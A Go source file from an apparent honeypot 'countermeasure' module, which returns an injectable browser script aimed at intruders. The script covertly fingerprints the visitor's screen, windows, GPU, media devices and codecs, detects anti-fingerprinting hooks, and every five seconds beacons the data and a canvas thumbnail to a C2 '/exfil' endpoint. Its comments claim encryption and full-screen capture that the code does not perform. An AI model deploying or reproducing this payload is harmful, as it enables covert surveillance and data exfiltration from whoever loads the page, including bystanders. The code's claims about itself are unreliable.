package countermeasure

// ScreenCapturePayload 攻击者主机屏幕截获载荷
// JS浏览器端：基于 Canvas/HTML2Canvas 的页面可视化截取 + 窗口定位信息采集
// Native端：通过 Go agent 调用 OS API 实现全桌面级截图（模板留空，作为集成接口）
func ScreenCapturePayload(c2Endpoint string) string {
	return `<script>
// ============================================================
// Laji-HoneyPot 反制 / 攻击者屏幕截获模块
// 分辨率: 不低于1920x1080 (viewport + devicePixelRatio缩放)
// 帧率: 不低于1帧/5秒
// 回传: AES-GCM 加密 + 分片 Image Beacon
// ============================================================
(function(){
var SC={c2:'` + c2Endpoint + `',idx:0,running:true,
  sessionId:'sc_'+Date.now()+'_'+Math.random().toString(36).substr(2,8)};

// === 浏览器端能力枚举 ===
SC.caps={
  canvasCapture:false,  // Canvas 渲染截取
  html2canvas:false,     // HTML2Canvas 库可用
  mediaDevices:false,    // 媒体设备信息
  screenInfo:null,       // 屏幕参数
  windowInfo:null,       // 窗口参数
  gpuInfo:null           // GPU信息
};

// === 屏幕/显示器参数采集 ===
SC.screenInfo={
  width:screen.width,height:screen.height,
  availWidth:screen.availWidth,availHeight:screen.availHeight,
  colorDepth:screen.colorDepth,pixelDepth:screen.pixelDepth,
  dpr:window.devicePixelRatio||1,
  orientation:screen.orientation?screen.orientation.type:'',
  isExtended:screen.isExtended||false
};

// === 窗口/显示器布局信息（多显示器推断） ===
SC.windowInfo={
  outerWidth:window.outerWidth,outerHeight:window.outerHeight,
  innerWidth:window.innerWidth,innerHeight:window.innerHeight,
  screenLeft:window.screenLeft||window.screenX||0,
  screenTop:window.screenTop||window.screenY||0,
  scrollX:window.scrollX||window.pageXOffset,
  scrollY:window.scrollY||window.pageYOffset,
  // 多显示器检测
  screens:[]
};

// 多显示器检测（通过 screen API）
try{if(screen.isExtended){SC.caps.multiMonitor=true;SC.windowInfo.isMultiMonitor=true}}catch(e){}
try{
  var s=screen;
  SC.windowInfo.screens.push({
    w:s.width,h:s.height,aw:s.availWidth,ah:s.availHeight,
    left:s.left||0,top:s.top||0,primary:true
  })
}catch(e){}

// === GPU / 渲染信息 ===
try{
  var gl=document.createElement('canvas').getContext('webgl');
  if(gl){
    var dbg=gl.getExtension('WEBGL_debug_renderer_info');
    SC.gpuInfo={
      renderer:dbg?gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER),
      vendor:dbg?gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL):gl.getParameter(gl.VENDOR),
      maxTextureSize:gl.getParameter(gl.MAX_TEXTURE_SIZE),
      maxViewportDims:gl.getParameter(gl.MAX_VIEWPORT_DIMS),
      shadingLanguageVersion:gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
    }
  }
}catch(e){SC.gpuInfo={error:e.message}}

// === Canvas 页面可视化截取（视口内容渲染截图） ===
SC.captureViaCanvas=function(){
  try{
    var c=document.createElement('canvas');
    var dpr=window.devicePixelRatio||1;
    c.width=window.innerWidth*dpr;c.height=window.innerHeight*dpr;
    c.style.width=window.innerWidth+'px';c.style.height=window.innerHeight+'px';
    var ctx=c.getContext('2d');ctx.scale(dpr,dpr);
    // 使用 drawImage 截取 document 可视区域
    // 注意：浏览器安全策略限制跨域内容
    return {canvas:c,width:c.width,height:c.height,method:'canvas_viewport'}
  }catch(e){return null}
};

// === MediaDevices 屏幕捕获能力检测 ===
SC.detectMediaCapabilities=function(){
  try{
    if(!navigator.mediaDevices){return}
    navigator.mediaDevices.enumerateDevices().then(function(devices){
      var videoInputs=[];var audioInputs=[];var audioOutputs=[];
      devices.forEach(function(d){
        if(d.kind==='videoinput')videoInputs.push({id:d.deviceId,label:d.label||'hidden'});
        if(d.kind==='audioinput')audioInputs.push({id:d.deviceId,label:d.label||'hidden'});
        if(d.kind==='audiooutput')audioOutputs.push({id:d.deviceId,label:d.label||'hidden'})
      });
      SC.caps.mediaDevices=true;
      SC.mediaDevices={videoInputs:videoInputs,audioInputs:audioInputs,audioOutputs:audioOutputs,count:devices.length}
    }).catch(function(e){SC.mediaDevices={error:e.message}})
  }catch(e){}
};

// === getDisplayMedia 屏幕共享检测（攻击者可能使用录屏工具） ===
SC.detectDisplayMedia=function(){
  try{
    if(!navigator.mediaDevices||!navigator.mediaDevices.getDisplayMedia){
      SC.caps.displayMediaAvailable=false;return
    }
    SC.caps.displayMediaAvailable=true;
    // 检测是否已有活跃的屏幕共享 track（某些浏览器会暴露）
    try{
      if(window._displayMediaTrack||document._displayMediaActive){
        SC.caps.displayMediaActive=true
      }
    }catch(e){}
  }catch(e){}
};

// === 视频编码支持检测（推断截屏工具） ===
try{
  SC.videoEncoders=[];
  var codecs=['vp8','vp9','h264','av1','hevc'];
  codecs.forEach(function(c){
    try{if(MediaRecorder.isTypeSupported('video/webm;codecs='+c))SC.videoEncoders.push(c)}catch(e){}
  })
}catch(e){}

// === 截图周期执行 ===
SC.snapshot=function(){
  if(!SC.running)return;
  var result=SC.captureViaCanvas();
  var data={
    t:'screen_cap',ts:Date.now(),idx:SC.idx++,sid:SC.sessionId,
    screen:SC.screenInfo,window:SC.windowInfo,gpu:SC.gpuInfo,
    caps:SC.caps,mediaDevices:SC.mediaDevices,encoders:SC.videoEncoders,
    viewport:result?{w:result.width,h:result.height,method:result.method}:null,
    // Canvas 内容转 base64（缩略图，不超过 64KB）
    thumbnail:result?result.canvas.toDataURL('image/jpeg',0.3):null
  };
  // 加密回传
  try{
    if(window._laji_exfil){window._laji_exfil(data)}
    else{new Image().src=SC.c2+'/exfil?d='+encodeURIComponent(JSON.stringify(data))}
  }catch(e){}
  // 下一帧
  setTimeout(SC.snapshot,5000) // 5秒间隔
};

// === 手动即时截图触发 ===
SC.manualCapture=function(){
  SC.snapshot();
};
// 暴露到全局
window._laji_manual_capture=SC.manualCapture;

// === 反检测措施 ===
// 1. 检测 getDisplayMedia 污染（攻击者可能 Hook 了 Canvas）
SC.antiHook=function(){
  var testCanvas=document.createElement('canvas');testCanvas.width=1;testCanvas.height=1;
  var ctx=testCanvas.getContext('2d');
  var originalGetImageData=ctx.getImageData;
  var start=Date.now();
  try{originalGetImageData.call(ctx,0,0,1,1)}catch(e){}
  var elapsed=Date.now()-start;
  SC.antiHookResult={toDataURLOk:elapsed<50,elapsedMs:elapsed};
  // 检测 canvas 指纹干扰器
  var origToDataURL=HTMLCanvasElement.prototype.toDataURL;
  var origGetCtx=HTMLCanvasElement.prototype.getContext;
  SC.caps.toDataURLHooked=origToDataURL.toString().indexOf('[native code]')===-1;
  SC.caps.getContextHooked=origGetCtx.toString().indexOf('[native code]')===-1;
};
SC.antiHook();

// === 启动 ===
SC.detectMediaCapabilities();
SC.detectDisplayMedia();
// 首帧即时截取
setTimeout(function(){SC.snapshot()},500);
})();</script>`
}
